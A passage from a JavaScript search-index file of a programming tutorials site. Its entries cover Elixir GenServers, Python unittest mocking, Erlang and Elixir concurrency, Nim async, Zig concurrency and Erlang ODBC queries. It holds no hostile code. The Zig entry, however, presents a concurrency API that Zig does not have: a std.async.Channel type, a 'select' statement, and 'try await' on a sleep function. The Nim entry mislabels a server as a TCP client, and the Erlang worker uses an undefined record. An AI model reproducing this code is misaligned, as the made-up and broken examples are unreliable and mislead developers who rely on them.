\u0026Map.put(\u00261, key, value)) end\nLet’s break that code apart a bit:\ndef put(bucket, key, value) do # Here is the client code Agent.update(bucket, fn state -\u003e # Here is the server code Map.put(state, key, value) end) # Back to the client code end In the code above, we have a process, which we call “the client” sending a request to an agent, “the server”. The request contains an anonymous function, which must be executed by the server.\nIn a GenServer, the code above would be two separate functions, roughly like this:\ndef put(bucket, key, value) do # Send the server a :put \"instruction\" GenServer.call(bucket, {:put, key, value}) end # Server callback def handle_call({:put, key, value}, _from, state) do {:reply, :ok, Map.put(state, key, value)} end There is quite a bit more ceremony in the GenServer code but, as we will see, it brings some benefits too.\nFor now, we will write only the server callbacks for our bucket registering logic, without providing a proper API, which we will do later.\nCreate a new file at lib/kv/registry.ex with the following contents:\ndefmodule KV.Registry do use GenServer ## Missing Client API - will add this later ## Defining GenServer Callbacks @impl true def init(:ok) do {:ok, %{}} end @impl true def handle_call({:lookup, name}, _from, names) do {:reply, Map.fetch(names, name), names} end @impl true def handle_cast({:create, name}, names) do if Map.has_key?(names, name) do {:noreply, names} else {:ok, bucket} = KV.Bucket.start_link([]) {:noreply, Map.put(names, name, bucket)} end end end There are two types of requests you can send to a GenServer: calls and casts. Calls are synchronous and the server must send a response back to such requests. While the server computes the response, the client is waiting. Casts are asynchronous: the server won’t send a response back and therefore the client won’t wait for one. Both requests are messages sent to the server, and will be handled in sequence. In the above implementation, we pattern-match on the :create messages, to be handled as cast, and on the :lookup messages, to be handled as call.\nIn order to invoke the callbacks above, we need to go through the corresponding GenServer functions. Let’s start a registry, create a named bucket, and then look it up:\n{:ok, registry} = GenServer.start_link(KV.Registry, :ok) {:ok, #PID\u003c0.136.0\u003e} GenServer.cast(registry, {:create, \"shopping\"}) :ok {:ok, bk} = GenServer.call(registry, {:lookup, \"shopping\"}) {:ok, #PID\u003c0.174.0\u003e} Our KV.Registry process received a cast with {:create, “shopping”} and a call with {:lookup, “shopping”}, in this sequence. GenServer.cast will immediately return, as soon as the message is sent to the registry. The GenServer.call on the other hand, is where we would be waiting for an answer, provided by the above KV.Registry.handle_call callback.\nYou may also have noticed that we have added @impl true before each callback. The @impl true informs the compiler that our intention for the subsequent function definition is to define a callback. If by any chance we make a mistake in the function name or in the number of arguments, like we define a handle_call/2, the compiler would warn us there isn’t any handle_call/2 to define, and would give us the complete list of known callbacks for the GenServer module.\nThis is all good and well, but we still want to offer our users an API that allows us to hide our implementation details.\nThe Client API linkA GenServer is implemented in two parts: the client API and the server callbacks. You can either combine both parts into a single module or you can separate them into a client module and a server module. The client is any process that invokes the client function. The server is always the process identifier or process name that we will explicitly pass as argument to the client API. Here we’ll use a single module for both the server callbacks and the client API.\nEdit the file at lib/kv/registry.ex, filling in the blanks for the client API:\n## Client API @doc \"\"\" Starts the registry. \"\"\" def start_link(opts) do GenServer.start_link(__MODULE__, :ok, opts) end @doc \"\"\" Looks up the bucket pid for `name` stored in `server`. Returns `{:ok, pid}` if the bucket exists, `:error` otherwise. \"\"\" def lookup(server, name) do GenServer.call(server, {:lookup, name}) end @doc \"\"\" Ensures there is a bucket associated with the given `name` in `server`. \"\"\" def create(server, name) do GenServer.cast(server, {:create, name}) end The first function is start_link/1, which starts a new GenServer passing a list of options. start_link/1 calls out to GenServer.start_link/3, which takes three arguments:\nThe module where the server callbacks are implemented, in this case MODULE (meaning the current module)\nThe initialization arguments, in this case the atom :ok\nA list of options which can be used to specify things like the name of the server. For now, we forward the list of options that we receive on start_link/1 to GenServer.start_link/3\nThe next two functions, lookup/2 and create/2, are responsible for sending these requests to the server. In this case, we have used {:lookup, name} and {:create, name} respectively. Requests are often specified as tuples, like this, in order to provide more than one “argument” in that first argument slot. It’s common to specify the action being requested as the first element of a tuple, and arguments for that action in the remaining elements. Note that the requests must match the first argument to handle_call/3 or handle_cast/2.\nThat’s it for the client API. On the server side, we can implement a variety of callbacks to guarantee the server initialization, termination, and handling of requests. Those callbacks are optional and for now, we have only implemented the ones we care about. Let’s recap.\nThe first is the init/1 callback, that receives the second argument given to GenServer.start_link/3 and returns {:ok, state}, where state is a new map. We can already notice how the GenServer API makes the client/server segregation more apparent. start_link/3 happens in the client, while init/1 is the respective callback that runs on the server.\nFor call/2 requests, we implement a handle_call/3 callback that receives the request, the process from which we received the request (_from), and the current server state (names). The handle_call/3 callback returns a tuple in the format {:reply, reply, new_state}. The first element of the tuple, :reply, indicates that the server should send a reply back to the client. The second element, reply, is what will be sent to the client while the third, new_state is the new server state.\nFor cast/2 requests, we implement a handle_cast/2 callback that receives the request and the current server state (names). The handle_cast/2 callback returns a tuple in the format {:noreply, new_state}. Note that in a real application we would have probably implemented the callback for :create with a synchronous call instead of an asynchronous cast. We are doing it this way to illustrate how to implement a cast callback.\nThere are other tuple formats both handle_call/3 and handle_cast/2 callbacks may return. There are other callbacks like terminate/2 and code_change/3 that we could implement. You are welcome to explore the full GenServer documentation to learn more about those.\nFor now, let’s write some tests to guarantee our GenServer works as expected.\nTesting a GenServer linkTesting a GenServer is not much different from testing an agent. We will spawn the server on a setup callback and use it throughout our tests. Create a file at test/kv/registry_test.exs with the following:\ndefmodule KV.RegistryTest do use ExUnit.Case, async: true setup do registry = start_supervised!(KV.Registry) %{registry: registry} end test \"spawns buckets\", %{registry: registry} do assert KV.Registry.lookup(registry, \"shopping\") == :error KV.Registry.create(registry, \"shopping\") assert {:ok, bucket} = KV.Registry.lookup(registry, \"shopping\") KV.Bucket.put(bucket, \"milk\", 1) assert KV.Bucket.get(bucket, \"milk\") == 1 end end Our test case first asserts there are no buckets in our registry, creates a named bucket, looks it up, and asserts it behaves as a bucket.\nThere is one important difference between the setup block we wrote for KV.Registry and the one we wrote for KV.Bucket. Instead of starting the registry by hand by calling KV.Registry.start_link/1, we instead called the ExUnit.Callbacks.start_supervised!/2 function, passing the KV.Registry module.\nThe start_supervised! function was injected into our test module by use ExUnit.Case. It does the job of starting the KV.Registry process, by calling its start_link/1 function. The advantage of using start_supervised! is that ExUnit will guarantee that the registry process will be shutdown before the next test starts. In other words, it helps guarantee that the state of one test is not going to interfere with the next one in case they depend on shared resources.\nWhen starting processes during your tests, we should always prefer to use start_supervised!. We recommend you to change the setup block in bucket_test.exs to use start_supervised! too.\nRun the tests and they should all pass!\nThe need for monitoring linkEverything we have done so far could have been implemented with a Agent. In this section, we will see one of many things that we can achieve with a GenServer that is not possible with an Agent.\nLet’s start with a test that describes how we want the registry to behave if a bucket stops or crashes:\ntest \"removes buckets on exit\", %{registry: registry} do KV.Registry.create(registry, \"shopping\") {:ok, bucket} = KV.Registry.lookup(registry, \"shopping\") Agent.stop(bucket) assert KV.Registry.lookup(registry, \"shopping\") == :error end The test above will fail on the last assertion as the bucket name remains in the registry even after we stop the bucket process.\nIn order to fix this bug, we need the registry to monitor every bucket it spawns. Once we set up a monitor, the registry will receive a notification every time a bucket process exits, allowing us to clean the registry up.\nLet’s first play with monitors by starting a new console with iex -S mix:\n{:ok, pid} = KV.Bucket.start_link([]) {:ok, #PID\u003c0.66.0\u003e} Process.monitor(pid) #Reference\u003c0.0.0.551\u003e Agent.stop(pid) :ok flush() {:DOWN, #Reference\u003c0.0.0.551\u003e, :process, #PID\u003c0.66.0\u003e, :normal} Note Process.monitor(pid) returns a unique reference that allows us to match upcoming messages to that monitoring reference. After we stop the agent, we can flush/0 all messages and notice a :DOWN message arrived, with the exact reference returned by monitor, notifying that the bucket process exited with reason :normal.\nLet’s reimplement the server callbacks to fix the bug and make the test pass. First, we will modify the GenServer state to two dictionaries: one that contains name -\u003e pid and another that holds ref -\u003e name. Then we need to monitor the buckets on handle_cast/2 as well as implement a handle_info/2 callback to handle the monitoring messages. The full server callbacks implementation is shown below:\n## Server callbacks @impl true def init(:ok) do names = %{} refs = %{} {:ok, {names, refs}} end @impl true def handle_call({:lookup, name}, _from, state) do {names, _} = state {:reply, Map.fetch(names, name), state} end @impl true def handle_cast({:create, name}, {names, refs}) do if Map.has_key?(names, name) do {:noreply, {names, refs}} else {:ok, bucket} = KV.Bucket.start_link([]) ref = Process.monitor(bucket) refs = Map.put(refs, ref, name) names = Map.put(names, name, bucket) {:noreply, {names, refs}} end end @impl true def handle_info({:DOWN, ref, :process, _pid, _reason}, {names, refs}) do {name, refs} = Map.pop(refs, ref) names = Map.delete(names, name) {:noreply, {names, refs}} end @impl true def handle_info(msg, state) do require Logger Logger.debug(\"Unexpected message in KV.Registry: #{inspect(msg)}\") {:noreply, state} end Observe that we were able to considerably change the server implementation without changing any of the client API. That’s one of the benefits of explicitly segregating the server and the client.\nFinally, different from the other callbacks, we have defined a “catch-all” clause for handle_info/2 that discards and logs any unknown message. To understand why, let’s move on to the next section.\ncall, cast or info? linkSo far we have used three callbacks: handle_call/3, handle_cast/2 and handle_info/2. Here is what we should consider when deciding when to use each:\nhandle_call/3 must be used for synchronous requests. This should be the default choice as waiting for the server reply is a useful back-pressure mechanism. handle_cast/2 must be used for asynchronous requests, when you don’t care about a reply. A cast does not guarantee the server has received the message and, for this reason, should be used sparingly. For example, the create/2 function we have defined in this chapter should have used call/2. We have used cast/2 for didactic purposes. handle_info/2 must be used for all other messages a server may receive that are not sent via GenServer.call/2 or GenServer.cast/2, including regular messages sent with send/2. The monitoring :DOWN messages are an example of this. Since any message, including the ones sent via send/2, go to handle_info/2, there is a chance that unexpected messages will arrive to the server. Therefore, if we don’t define the catch-all clause, those messages could cause our registry to crash, because no clause would match. We don’t need to worry about such cases for handle_call/3 and handle_cast/2 though. Calls and casts are only done via the GenServer API, so an unknown message is quite likely a developer mistake.\nTo help developers remember the differences between call, cast and info, the supported return values and more, we have a tiny GenServer cheat sheet.\nMonitors or links? linkWe have previously learned about links in the Process chapter. Now, with the registry complete, you may be wondering: when should we use monitors and when should we use links?\nLinks are bi-directional. If you link two processes and one of them crashes, the other side will crash too (unless it is trapping exits). A monitor is uni-directional: only the monitoring process will receive notifications about the monitored one. In other words: use links when you want linked crashes, and monitors when you just want to be informed of crashes, exits, and so on.\nReturning to our handle_cast/2 implementation, you can see the registry is both linking and monitoring the buckets:\n{:ok, bucket} = KV.Bucket.start_link([]) ref = Process.monitor(bucket)\nThis is a bad idea, as we don’t want the registry to crash when a bucket crashes. The proper fix is to actually not link the bucket to the registry. Instead, we will link each bucket to a special type of process called Supervisors, which are explicitly designed to handle failures and crashes.\n"
            }
        );
    index.add(
            {
                id:  61 ,
                href: "\/tutorials\/docs\/python\/python\/python_testing\/",
                title: "Comprehensive Guide to Testing in Python: Unit Tests and Mocking Techniques",
                description: "Dive into Python testing methodologies with a thorough look at unit testing using the unittest framework and mocking objects with unittest.mock. Learn how to build robust tests and simulate complex scenarios to ensure your code performs reliably.",
                content: "Introduction linkTesting is an essential aspect of software development that ensures your code behaves as expected and can handle various input scenarios without crashing. Python offers several built-in libraries for testing, with unittest being one of the most popular for unit testing.\nUnit Testing with unittest linkunittest is a testing framework inspired by JUnit. It supports test automation, sharing of setup and shutdown code, aggregation of tests into collections, and independence of the tests from the reporting framework.\nBasic Structure of a Unit Test link import unittest class TestStringMethods(unittest.TestCase): def test_upper(self): self.assertEqual('foo'.upper(), 'FOO') def test_isupper(self): self.assertTrue('FOO'.isupper()) self.assertFalse('Foo'.isupper()) def test_split(self): s = 'hello world' self.assertEqual(s.split(), ['hello', 'world']) # Check that s.split fails when the separator is not a string with self.assertRaises(TypeError): s.split(2) if __name__ == '__main__': unittest.main() In this example, TestStringMethods is a test case class that inherits from unittest.TestCase. It includes several test methods to check string operations. assertEqual checks for expected results; assertTrue and assertFalse verify conditions; assertRaises checks that an error is raised when expected.\nMocking Objects with unittest.mock linkMocking is crucial for isolating tests by replacing the parts of the system that are outside of the test’s control with objects that simulate the behavior of the real ones. The unittest.mock module provides a core Mock class removing the need for stubs and fakes, and making it easy to configure return values and test behavior.\nUsing Mocks to Simulate Behaviors link from unittest.mock import MagicMock class MyDatabase: # Simulated database class def process(self, query): pass class TestMyDatabase(unittest.TestCase): def test_query_processing(self): # Create a mock object db = MyDatabase() db.process = MagicMock(return_value='Success') # Test method response = db.process(\"SELECT * FROM users\") db.process.assert_called_with(\"SELECT * FROM users\") self.assertEqual(response, 'Success') if __name__ == '__main__': unittest.main() Here, MyDatabase has a process method simulated in the test by replacing it with a MagicMock object. MagicMock can be configured to return a specific value when called, allowing for controlled and predictable testing environments.\nConclusion linkTesting in Python, especially using the unittest framework and mocking techniques, provides robust tools for ensuring that your applications are reliable and maintainable. Through unit testing, you can catch bugs early in the development cycle, and by using mocks, you can isolate and test specific components without relying on external systems.\n"
            }
        );
    index.add(
            {
                id:  62 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/concurrency_and_process\/",
                title: "Concurrency and Process Management in Erlang",
                description: "An in-depth look at how Erlang handles concurrency and process management.",
                content: "Concurrency and Process Management in Erlang linkErlang’s concurrency model is one of its most powerful features, making it ideal for building scalable and reliable systems. Understanding how Erlang handles concurrency and process management is crucial for leveraging its full potential.\nThe Actor Model linkErlang’s concurrency is based on the Actor model, where each actor is a process that communicates with others through message passing. This model simplifies concurrent programming by avoiding shared state and locks.\nLightweight Processes linkErlang processes are lightweight and have their own memory and scheduling. They are not OS threads but are managed by the Erlang VM, allowing the creation of millions of concurrent processes with minimal overhead.\nCreating Processes linkProcesses in Erlang are created using the spawn function. Each process runs independently and can communicate with other processes via message passing.\nCode Example: Creating a Process\n-module(process_example). -export([start/0, loop/0]). start() -\u003e Pid = spawn(process_example, loop, []), Pid ! {self(), \"Hello, Process!\"}. loop() -\u003e receive {From, Message} -\u003e io:format(\"Received ~p from ~p~n\", [Message, From]), loop() end. Message Passing linkProcesses communicate by sending and receiving messages. Messages are sent using the ! operator and received using the receive block.\nCode Example: Message Passing\n-module(message_example). -export([start/0, loop/0]). start() -\u003e Pid = spawn(message_example, loop, []), Pid ! {self(), \"Hello, Process!\"}. loop() -\u003e receive {From, Message} -\u003e io:format(\"Received ~p from ~p~n\", [Message, From]), loop() end. Process Monitoring and Linking linkErlang provides mechanisms for monitoring and linking processes to handle failures gracefully. Monitoring allows a process to be notified if another process terminates, while linking ensures that linked processes terminate together.\nCode Example: Process Monitoring\n-module(monitor_example). -export([start/0, monitored_process/0]). start() -\u003e Pid = spawn(monitor_example, monitored_process, []), Ref = erlang:monitor(process, Pid), Pid ! stop, receive {'DOWN', Ref, process, Pid, Reason} -\u003e io:format(\"Process ~p terminated with reason: ~p~n\", [Pid, Reason]) end. monitored_process() -\u003e receive stop -\u003e io:format(\"Stopping process~n\") end. Supervisor Trees linkErlang’s Open Telecom Platform (OTP) framework provides a robust way to manage processes through supervisor trees. Supervisors are special processes that monitor worker processes and restart them if they fail.\nCode Example: Supervisor and Worker\n-module(supervisor_example). -behaviour(supervisor). -export([start_link/0, init/1]). start_link() -\u003e supervisor:start_link({local, ?MODULE}, ?MODULE, []). init([]) -\u003e {ok, {{one_for_one, 5, 10}, [{worker, {worker_example, start_link, []}, permanent, 5000, worker, [worker_example]}]}}. -module(worker_example). -behaviour(gen_server). -export([start_link/0, init/1, handle_call/3, handle_cast/2, terminate/2, code_change/3]). start_link() -\u003e gen_server:start_link({local, ?MODULE}, ?MODULE, [], []). init([]) -\u003e {ok, #state{}}. handle_call(_Request, _From, State) -\u003e {reply, ok, State}. handle_cast(_Msg, State) -\u003e {noreply, State}. terminate(_Reason, _State) -\u003e ok. code_change(_OldVsn, State, _Extra) -\u003e {ok, State}. In this example, a supervisor (supervisor_example) manages a worker process (worker_example). The supervisor ensures that if the worker process crashes, it is restarted automatically.\nConclusion linkErlang’s concurrency and process management features make it an excellent choice for building scalable and fault-tolerant systems. By leveraging lightweight processes, message passing, and the robust OTP framework, developers can create highly concurrent applications that are easy to maintain and extend. Understanding these concepts is key to mastering Erlang and making the most of its capabilities.\n"
            }
        );
    index.add(
            {
                id:  63 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/04_concurrency_in_elixir_with_otp\/",
                title: "Concurrency in Elixir with OTP",
                description: "Learn more about concurrency in Elixir with OTP",
                content: "Concurrency is one of the core strengths of Elixir, and the language leverages the powerful capabilities of the Erlang VM to build highly concurrent and fault-tolerant systems. In this section, we will explore concurrency in Elixir using OTP (Open Telecom Platform), which is a set of libraries and design principles for building scalable and maintainable applications.\nIntroduction linkWhy Concurrency in Elixer? linkElixir, built on the Erlang VM, is designed for building concurrent, distributed, and fault-tolerant applications. The actor model, used by Elixir, provides a robust way to manage concurrency by treating each process as an independent entity that communicates with other processes via message passing.\nWhat is OTP? linkOTP stands for Open Telecom Platform. It is a collection of middleware, libraries, and tools used to design and implement concurrent, scalable, and fault-tolerant systems. OTP provides several abstractions like GenServer, Supervisor, and Application, which simplify building and maintaining complex applications.\nProcesses in Elixir linkCreating Processes linkIn Elixir, processes are lightweight and run in isolation. They are created using the spawn function:\ndefmodule SimpleProcess do def greet do IO.puts(\"Hello from a process!\") end end pid = spawn(SimpleProcess, :greet, []) Here, spawn/3 creates a new process that executes the greet function\nSending and Receiving Messages linkProcesses communicate via message passing. You can send a message to a process using the send function and receive messages using the receive block:\ndefmodule Messenger do def loop do receive do {:msg, sender, message} -\u003e IO.puts(\"Received message: #{message}\") send(sender, {:ok, self()}) loop() end end end pid = spawn(Messenger, :loop, []) send(pid, {:msg, self(), \"Hello\"}) receive do {:ok, _pid} -\u003e IO.puts(\"Message received successfully!\") end GenServer linkGenServer is a generic server implementation that abstracts the common patterns of working with processes. It simplifies the implementation of servers in Elixir by providing a standard way to define and handle state, callbacks, and message passing.\nCreating a GenServer linkTo create a GenServer, you need to define a module that uses GenServer and implement the required callbacks:\ndefmodule MyGenServer do use GenServer # Client API def start_link(initial_state) do GenServer.start_link(__MODULE__, initial_state, name: __MODULE__) end def get_state do GenServer.call(__MODULE__, :get_state) end def set_state(new_state) do GenServer.cast(__MODULE__, {:set_state, new_state}) end # Server Callbacks @impl true def init(initial_state) do {:ok, initial_state} end @impl true def handle_call(:get_state, _from, state) do {:reply, state, state} end @impl true def handle_cast({:set_state, new_state}, _state) do {:noreply, new_state} end end Using the GenServer linkYou can start and interact with the GenServer using the client API functions:\n{:ok, _pid} = MyGenServer.start_link(%{count: 0}) IO.inspect(MyGenServer.get_state()) # Output: %{count: 0} MyGenServer.set_state(%{count: 42}) IO.inspect(MyGenServer.get_state()) # Output: %{count: 42} Supervisors linkSupervisors are a core part of OTP that provide fault tolerance by monitoring processes and restarting them if they fail. Supervisors are designed to manage process lifecycles, making it easier to build resilient systems.\nCreating a Supervisor linkTo create a supervisor, define a module that uses Supervisor and specify a supervision strategy:\ndefmodule MySupervisor do use Supervisor def start_link(_) do Supervisor.start_link(__MODULE__, :ok, name: __MODULE__) end @impl true def init(:ok) do children = [ {MyGenServer, %{count: 0}} ] Supervisor.init(children, strategy: :one_for_one) end end Starting the Supervisor linkYou can start the supervisor and it will automatically start its child processes:\n{:ok, _pid} = MySupervisor.start_link(:ok) IO.inspect(MyGenServer.get_state()) # Output: %{count: 0} MyGenServer.set_state(%{count: 42}) IO.inspect(MyGenServer.get_state()) # Output: %{count: 42} "
            }
        );
    index.add(
            {
                id:  64 ,
                href: "\/tutorials\/docs\/nim\/nim\/concurrency_in_nim\/",
                title: "Concurrency in Nim",
                description: "Nim Lang description",
                content: "Nim provides concurrency using the async/await syntax, powered by the asyncdispatch module. This allows you to write asynchronous functions that can run concurrently on a single thread, making it especially useful for IO-intensive tasks.\nKey Concepts link Concurrency vs. Parallelism: Concurrency involves managing multiple tasks at the same time, but not necessarily running them simultaneously. Parallelism, on the other hand, means running multiple tasks simultaneously. Nim’s async model is focused on concurrency. Async Functions: Functions that use the async/await syntax are marked with the {.async.} pragma. Await Keyword: Used to wait for an asynchronous procedure to complete. Example of Concurrency linkHere is a basic example demonstrating how to use async/await in Nim:\nimport asyncdispatch proc ioManager(id: string) {.async.} = for i in 1..10: # wait for some async process await sleepAsync(10) echo id \u0026 \" - run: \" \u0026 $i let ma = ioManager(\"a\") mb = ioManager(\"b\") waitFor ma and mb Explanation:\nAsync Function: The ioManager function is marked as {.async.} and can now use await. Await: Inside the loop, await sleepAsync(10) pauses the execution of ioManager for 10 milliseconds without blocking the entire program. Running Functions: waitFor ma and mb ensures the program waits until both ma and mb complete. Expected Output:\na - run: 1 b - run: 1 a - run: 2 b - run: 2 a - run: 3 b - run: 3 ... This output shows the interleaved execution of ioManager with different IDs, demonstrating concurrency.\nBlocking Indefinitely linkTo block indefinitely waiting for all asynchronous functions to complete, you can use:\nrunForever() This is useful for server applications or long-running tasks.\nHigher Async Modules linkThe asyncdispatch module serves as the foundation for several higher-level modules that provide async functionality for specific purposes:\nasyncfile: For asynchronous file operations. asyncnet: For asynchronous networking operations. asynchttpserver: For an asynchronous HTTP server. Example with asyncnet linkHere’s an example of using asyncnet for a simple TCP client:\nimport asyncdispatch, asyncnet proc handleClient(client: AsyncSocket) {.async.} = let data = await client.recv(1024) echo \"Received: \", data await client.send(\"Hello, client!\") client.close() proc startServer() {.async.} = let server = await newAsyncSocket() await server.bindAddr(Port(9000)) server.listen() while true: let client = await server.accept() handleClient(client) asyncCheck startServer() runForever() Explanation:\nhandleClient: Receives data from the client, sends a response, and then closes the connection. startServer: Sets up a server that listens on port 9000 and accepts incoming connections. asyncCheck: Ensures startServer runs asynchronously. runForever: Blocks indefinitely, allowing the server to run continuously. Summary link Async Functions: Mark functions with {.async.} and use await to wait for async operations. waitFor: Use to wait for the completion of async functions. runForever: Blocks indefinitely, useful for long-running async tasks. Higher-Level Modules: Use modules like asyncfile, asyncnet, and asynchttpserver for specific asynchronous operations. Nim’s async/await syntax and related modules provide a powerful and flexible way to handle concurrency, making it easier to write efficient IO-bound programs.\n"
            }
        );
    index.add(
            {
                id:  65 ,
                href: "\/tutorials\/docs\/zig\/zig\/concurrency_in_zig\/",
                title: "Concurrency in Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "Concurrency is a fundamental aspect of modern software development, enabling programs to execute multiple tasks concurrently for improved performance and responsiveness. Zig provides powerful concurrency primitives that make it easy to write concurrent programs while maintaining safety and performance. In this tutorial, we’ll explore Zig’s concurrency features, including async/await, channels, and message passing.\nAsync/Await linkZig’s async/await syntax allows you to write asynchronous code that is easy to read and reason about. Asynchronous functions can perform I/O operations, wait for timers, or execute CPU-bound tasks without blocking the main thread.\nWriting Asynchronous Functions linkTo define an asynchronous function in Zig, use the async keyword before the function signature. Inside the function, use the suspend keyword to mark points where the function can yield control back to the event loop.\nconst std = @import(\"std\"); // An asynchronous function that waits for a specified duration. async fn sleep(duration: u64) void { // Suspend the function for the given duration. suspend std.time.sleep(duration * std.time.millisecond); // Function resumes after the sleep duration. } Using Async/Await linkYou can invoke asynchronous functions using the await keyword, which suspends the current function until the asynchronous operation completes.\nconst std = @import(\"std\"); // An example function that demonstrates async/await usage. pub fn main() !void { const duration = 1000; // milliseconds try await sleep(duration); std.debug.print(\"Slept for {} milliseconds.\\n\", .{duration}); } Channels linkChannels provide a safe and efficient way for different parts of a program to communicate by sending and receiving messages. Zig’s channel implementation is based on the CSP (Communicating Sequential Processes) model.\nCreating and Sending Messages linkYou can create a channel using the std.async.Channel type. Channels are generic over the type of messages they can transmit.\nconst std = @import(\"std\"); pub fn main() !void { var channel = try std.async.Channel(i32).create(std.heap.c_allocator); const message = 42; try channel.send(message); std.debug.print(\"Sent message: {}\\n\", .{message}); } Receiving Messages linkTo receive messages from a channel, use the receive method, which blocks until a message is available.\nconst std = @import(\"std\"); pub fn main() !void { var channel = try std.async.Channel(i32).create(std.heap.c_allocator); const message = 42; try channel.send(message); const received_message = try channel.receive(); std.debug.print(\"Received message: {}\\n\", .{received_message}); } Select linkThe select statement allows you to wait for multiple channel operations simultaneously, enabling non-blocking communication.\nconst std = @import(\"std\"); pub fn main() !void { var channel1 = try std.async.Channel(i32).create(std.heap.c_allocator); var channel2 = try std.async.Channel(i32).create(std.heap.c_allocator); try channel1.send(1); try channel2.send(2); select { channel1.receive() -\u003e message1 =\u003e { std.debug.print(\"Received from channel 1: {}\\n\", .{message1}); } channel2.receive() -\u003e message2 =\u003e { std.debug.print(\"Received from channel 2: {}\\n\", .{message2}); } } } Conclusion linkZig’s concurrency features, including async/await, channels, and the select statement, empower developers to write efficient and expressive concurrent programs. By leveraging these primitives, you can build highly responsive and scalable applications while ensuring safety and correctness.\nThis tutorial covers the basics of concurrency in Zig, providing you with a solid foundation to explore more advanced topics and build sophisticated concurrent applications. Happy coding!\n"
            }
        );
    index.add(
            {
                id:  66 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/databases_in_erlang\/",
                title: "Connecting to SQL Databases Using Erlang's ODBC Library",
                description: "Prerequisites linkBefore connecting to a Microsoft SQL Server database, ensure the following:\nYou have created a database TESTDB. You have created a table EMPLOYEE in TESTDB with fields FIRST_NAME, LAST_NAME, AGE, SEX, and INCOME. User ID testuser and password test123 are set to access TESTDB. An ODBC DSN named usersqlserver has been created, which connects to the database. Establishing a Database Connection linkTo establish a connection to the database, use the following code example:",
                content: "Prerequisites linkBefore connecting to a Microsoft SQL Server database, ensure the following:\nYou have created a database TESTDB. You have created a table EMPLOYEE in TESTDB with fields FIRST_NAME, LAST_NAME, AGE, SEX, and INCOME. User ID testuser and password test123 are set to access TESTDB. An ODBC DSN named usersqlserver has been created, which connects to the database. Establishing a Database Connection linkTo establish a connection to the database, use the following code example:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), io:fwrite(\"~p\", [Ref]). Output link \u003c0.33.0\u003e Explanation link odbc:start/0: Initializes the ODBC application. odbc:connect/2: Establishes a connection using the provided DSN, user ID, and password. io:fwrite/2: Prints the reference to the established connection. Creating a Database Table linkAfter connecting to the database, you can create tables. Here is an example:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), odbc:sql_query(Ref, \"CREATE TABLE EMPLOYEE (FIRST_NAME VARCHAR(20), LAST_NAME VARCHAR(20), AGE INTEGER, SEX CHAR(1), INCOME INTEGER)\"). Inserting Records linkTo insert a record into the EMPLOYEE table, use the following code:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), io:fwrite(\"~p\", [odbc:sql_query(Ref, \"INSERT INTO EMPLOYEE VALUES('Mac', 'Mohan', 20, 'M', 2000)\")]). Output link {updated,1} Fetching Records linkTo fetch records from the EMPLOYEE table, use the following code:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), io:fwrite(\"~p\", [odbc:sql_query(Ref, \"SELECT * FROM EMPLOYEE\")]). Output link {selected,[\"FIRST_NAME\",\"LAST_NAME\",\"AGE\",\"SEX\",\"INCOME\"],[{\"Mac\",\"Mohan\",20,\"M\",2000}]} Fetching Records with Parameters linkTo fetch records based on certain criteria, use parameterized queries:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), io:fwrite(\"~p\", [odbc:param_query(Ref, \"SELECT * FROM EMPLOYEE WHERE SEX=?\", [{{sql_char, 1}, [\"M\"]}])]). Output link {selected,[\"FIRST_NAME\",\"LAST_NAME\",\"AGE\",\"SEX\",\"INCOME\"],[{\"Mac\",\"Mohan\",20,\"M\",2000}]} Updating Records linkTo update records in the EMPLOYEE table, use the following code:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), io:fwrite(\"~p\", [odbc:sql_query(Ref, \"UPDATE EMPLOYEE SET AGE = 5 WHERE INCOME = 2000\")]). Output link {updated,1} Deleting Records linkTo delete records from the EMPLOYEE table, use the following code:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), io:fwrite(\"~p\", [odbc:sql_query(Ref, \"DELETE FROM EMPLOYEE WHERE INCOME = 2000\")]). Output link {updated,1} Describing a Table Structure linkTo describe the structure of the EMPLOYEE table, use the following code:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), io:fwrite(\"~p\", [odbc:describe_table(Ref, \"EMPLOYEE\")]). Output link {ok,[{\"FIRST_NAME\",{sql_varchar,20}}, {\"LAST_NAME\",{sql_varchar,20}}, {\"AGE\",sql_integer}, {\"SEX\",{sql_char,1}}, {\"INCOME\",sql_integer}]} Fetching Record Count linkTo fetch the total count of records in the EMPLOYEE table, use the following code:\nExample link -module(helloworld). -export([start/0]). start() -\u003e odbc:start(), {ok, Ref} = odbc:connect(\"DSN=usersqlserver;UID=testuser;PWD=test123\", []), io:fwrite(\"~p\", [odbc:select_count(Ref, \"SELECT * FROM EMPLOYEE\")]). Output link {ok,1} Conclusion linkErlang’s ODBC library provides robust capabilities for interacting with SQL databases. By following the examples provided, you can establish connections, create tables, and perform CRUD (Create, Read, Update, Delete) operations on your database.\n"
            }
        );
    index.add(
            {
                id:  67 ,
                href: "\/tutorials\/docs\/nim\/nim\/containers\/",
                title: "Containers and Procedures in Nim",
                description: "Nim Lang description",
